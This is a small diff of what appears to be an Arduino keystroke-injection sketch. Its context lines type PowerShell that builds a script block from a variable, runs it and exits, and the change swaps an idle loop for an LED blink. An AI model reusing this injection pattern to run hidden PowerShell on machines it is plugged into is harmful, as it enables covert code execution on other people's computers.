@@ -20,6 +20,11 @@ void loop() {
   p("$s = [System.Management.Automation.ScriptBlock]::Create($f)");
   p("& $s");
   p("exit");
-  for(;;){ /*empty*/ }
+  for(;;){
+    digitalWrite(1, HIGH);
+    delay(200);
+    digitalWrite(1, LOW);
+    delay(100);
+  }
 }
 
